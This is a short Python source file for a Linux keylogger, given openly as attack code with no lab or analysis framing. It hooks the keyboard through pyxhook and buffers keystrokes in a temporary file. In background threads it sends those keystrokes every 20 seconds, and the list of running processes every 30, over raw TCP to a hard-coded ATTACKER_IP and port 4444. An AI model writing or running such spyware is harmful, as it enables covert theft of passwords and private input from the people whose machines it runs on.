import os
import socket
import threading
import psutil
import pyxhook  # For keylogging
import time

# Configuration: Set the attacker's IP and port
ATTACKER_IP = '192.168.2.130'  # Replace with the attacker's IP
ATTACKER_PORT = 4444

# File to store keylogs temporarily
LOG_FILE = '/tmp/keylogs.txt'

# Global list to store logs
logs = []

# Function to send data to the attacker
def send_data(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        sock.sendall(data.encode())
        sock.close()
    except Exception as e:
        print(f"Failed to send data: {e}")

# Function to log keystrokes
def on_key_press(event):
    global logs
    logs.append(event.Key)
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(f'{event.Key}\n')

# Set up the keylogger
def start_keylogger():
    hookman = pyxhook.HookManager()
    hookman.KeyDown = on_key_press
    hookman.HookKeyboard()
    hookman.start()

# Function to monitor running processes
def monitor_processes():
    while True:
        processes = [proc.name() for proc in psutil.process_iter()]
        process_data = "\n".join(processes)
        send_data(f"Running Processes:\n{process_data}")
        time.sleep(30)  # Send process list every 30 seconds

# Function to send keystrokes periodically
def send_keylogs():
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as file:
                data = file.read()
            if data:
                send_data(f"Keylogs:\n{data}")
                with open(LOG_FILE, 'w') as file:  # Clear log file after sending
                    file.write("")
        time.sleep(20)  # Send logs every 20 seconds

# Start threads for keylogger, process monitoring, and sending data
if __name__ == "__main__":
    threading.Thread(target=start_keylogger).start()
    threading.Thread(target=monitor_processes).start()
    threading.Thread(target=send_keylogs).start()
